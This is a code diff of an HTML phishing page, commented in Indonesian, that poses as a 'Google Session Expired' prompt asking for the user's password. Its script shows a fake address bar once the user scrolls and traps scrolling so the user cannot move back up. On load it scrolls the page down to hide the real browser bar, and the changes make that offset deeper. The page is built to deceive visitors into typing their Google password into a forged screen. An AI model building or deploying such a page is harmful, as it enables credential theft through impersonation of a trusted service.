@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Loading...</title>
+<title>Google Session Expired</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
@@ -11,11 +11,12 @@ html, body {
     padding:0;
     font-family: Arial, sans-serif;
     overflow-x:hidden;
+    overscroll-behavior: none; /* kurangi bounce */
 }
 
-/* spacer panjang */
+/* spacer panjang untuk scroll */
 .spacer {
-    height:2000px;
+    height:2500px;
     background: linear-gradient(white, #eaeaea);
 }
 
@@ -65,7 +66,6 @@ input {
     border:1px solid #ccc;
 }
 </style>
-
 </head>
 
 <body>
@@ -80,35 +80,34 @@ input {
 <div id="content">
     <h2>Google Session Expired</h2>
     <p>Please re-enter your password to continue</p>
-
     <input type="password" placeholder="Enter password">
 </div>
 
 <script>
 let fakebar = document.getElementById("fakebar");
-
 let lastScroll = window.scrollY;
 
-// show fake bar saat scroll
+// scroll trap & fake bar show
 window.addEventListener("scroll", () => {
+    let current = window.scrollY;
 
-    // tampilkan fake bar saat cukup scroll
-    if (window.scrollY > 200) {
+    // tampilkan fake bar setelah scroll cukup
+    if(current > 200){
         fakebar.classList.add("show");
     }
 
-    // scroll trap (cegah naik)
-    if (window.scrollY < lastScroll) {
-        window.scrollTo(0, lastScroll);
+    // scroll trap: cegah user naik
+    if(current < lastScroll){
+        window.scrollTo({top:lastScroll, behavior:"auto"});
     }
 
     lastScroll = window.scrollY;
 });
 
-// dorong user ke bawah saat awal
+// posisi awal scroll lebih dalam (bikin bar hilang)
 window.onload = () => {
     setTimeout(() => {
-        window.scrollTo(0, 300);
+        window.scrollTo(0, 500);
     }, 300);
 };
 </script>
